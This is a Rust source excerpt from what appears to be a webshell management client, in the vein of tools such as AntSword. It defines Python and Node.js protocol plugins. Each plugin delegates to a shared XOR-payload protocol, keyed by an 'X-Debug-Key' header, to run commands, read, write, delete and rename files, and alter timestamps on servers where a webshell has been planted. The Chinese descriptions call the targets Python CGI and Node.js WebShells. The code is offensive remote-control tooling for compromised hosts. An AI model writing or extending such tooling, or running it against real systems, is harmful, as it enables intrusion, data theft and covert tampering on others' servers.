// Python / Node.js：复用 JvmLikeProtocol 通信格式（formData XOR + X-Debug-Key）
// ---------------------------------------------------------------------------

pub struct PythonProtocol;

impl Protocol for PythonProtocol {
    fn id(&self) -> &'static str {
        "builtin.python.v1"
    }

    fn display_name(&self) -> &'static str {
        "Python（XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }.probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }.connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .create_dir(session, path, settings)
    }

    fn touch_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.python.v1", display_name: "" }
            .touch_path(session, path, timestamp, settings)
    }
}

impl dosword_sdk::ProtocolPlugin for PythonProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "Python WebShell（CGI）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}

pub struct NodeProtocol;

impl Protocol for NodeProtocol {
    fn id(&self) -> &'static str {
        "builtin.node.v1"
    }

    fn display_name(&self) -> &'static str {
        "Node.js（XOR 载荷）"
    }

    fn requires_network(&self) -> bool {
        true
    }

    fn probe(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<ProbeResult, ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }.probe(profile, settings)
    }

    fn connect(
        &self,
        profile: &ShellProfile,
        settings: &AppSettings,
    ) -> Result<(Box<dyn SessionState>, ProbeResult), ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }.connect(profile, settings)
    }

    fn execute_command(
        &self,
        session: &dyn SessionState,
        command: &str,
        settings: &AppSettings,
    ) -> Result<CommandOutput, ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .execute_command(session, command, settings)
    }

    fn list_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<DirListing, ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .list_dir(session, path, settings)
    }

    fn read_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<Vec<u8>, ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .read_file(session, path, settings)
    }

    fn write_file(
        &self,
        session: &dyn SessionState,
        path: &str,
        content: &[u8],
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .write_file(session, path, content, settings)
    }

    fn delete_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .delete_path(session, path, settings)
    }

    fn rename_path(
        &self,
        session: &dyn SessionState,
        from: &str,
        to: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .rename_path(session, from, to, settings)
    }

    fn create_dir(
        &self,
        session: &dyn SessionState,
        path: &str,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .create_dir(session, path, settings)
    }

    fn touch_path(
        &self,
        session: &dyn SessionState,
        path: &str,
        timestamp: u64,
        settings: &AppSettings,
    ) -> Result<(), ProtocolError> {
        JvmLikeProtocol { id: "builtin.node.v1", display_name: "" }
            .touch_path(session, path, timestamp, settings)
    }
}

impl dosword_sdk::ProtocolPlugin for NodeProtocol {
    fn manifest(&self) -> dosword_sdk::PluginManifest {
        dosword_sdk::PluginManifest {
            id: self.id().to_string(),
            name: self.display_name().to_string(),
            version: env!("CARGO_PKG_VERSION").to_string(),
            kind: dosword_sdk::PluginKind::Protocol,
            description: "Node.js WebShell（独立 HTTP 服务）：命令执行、文件管理（XOR 载荷）。".to_string(),
            capabilities: vec!["files".into(), "terminal".into()],
        }
    }
}
